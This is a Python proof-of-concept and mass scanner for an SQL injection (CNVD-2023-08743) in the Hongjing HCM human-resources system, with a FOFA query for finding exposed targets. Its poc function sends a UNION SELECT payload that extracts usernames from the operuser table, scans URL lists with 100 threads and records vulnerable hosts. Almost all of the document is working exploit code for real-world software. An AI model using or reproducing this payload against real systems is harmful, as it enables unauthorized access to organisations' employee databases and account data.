# 宏景HCM SQL注入漏洞复现 (CNVD-2023-08743)
# fofa:body='<div class="hj-hy-all-one-logo"' && title="人力资源信息管理系统"

import requests,argparse,time,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ ,--.-,,-,--,   _,.---._    .-._            _,---.       ,--.-, .=-.-..-._            _,---.   
/==/  /|=|  | ,-.' , -  `. /==/ \  .-._ _.='.'-,  \     |==' -|/==/_ /==/ \  .-._ _.='.'-,  \  
|==|_ ||=|, |/==/_,  ,  - \|==|, \/ /, /==.'-     /     |==|- |==|, ||==|, \/ /, /==.'-     /  
|==| ,|/=| _|==|   .=.     |==|-  \|  /==/ -   .-'    __|==|, |==|  ||==|-  \|  /==/ -   .-'   
|==|- `-' _ |==|_ : ;=:  - |==| ,  | -|==|_   /_,-.,--.-'\=|- |==|- ||==| ,  | -|==|_   /_,-.  
|==|  _     |==| , '='     |==| -   _ |==|  , \_.' )==|- |=/ ,|==| ,||==| -   _ |==|  , \_.' ) 
|==|   .-. ,\\==\ -    ,_ /|==|  /\ , \==\-  ,    (|==|. /=| -|==|- ||==|  /\ , \==\-  ,    (  
/==/, //=/  | '.='. -   .' /==/, | |- |/==/ _  ,  /\==\, `-' //==/. //==/, | |- |/==/ _  ,  /   version:1.0.0
`--`-' `-`--`   `--`--''   `--`./  `--``--`------'  `--`----' `--`-` `--`./  `--``--`------'    author :冷酷小帅
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="宏景HCM存在SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input yout link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
        
def poc(target):
    payload_url = '/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d'
    url = target + payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Accept':'*/*',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Connection':'close'
    }
    try:
        res = requests.get(url=url,headers=headers,timeout=5,verify=False)
        if res.status_code == 200 and "TreeNode id=" in res.text and "text=" in res.text:
            print(f'[+]该url:{target}存在SQL注入漏洞')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在SQL注入漏洞'+'\n')
        else:
            print(f'[-]该url:{target}不存在SQL注入漏洞')
    except:
        print(f'[-]该站点:{target}存在访问问题，请手动测试')

if __name__ == '__main__':
    main()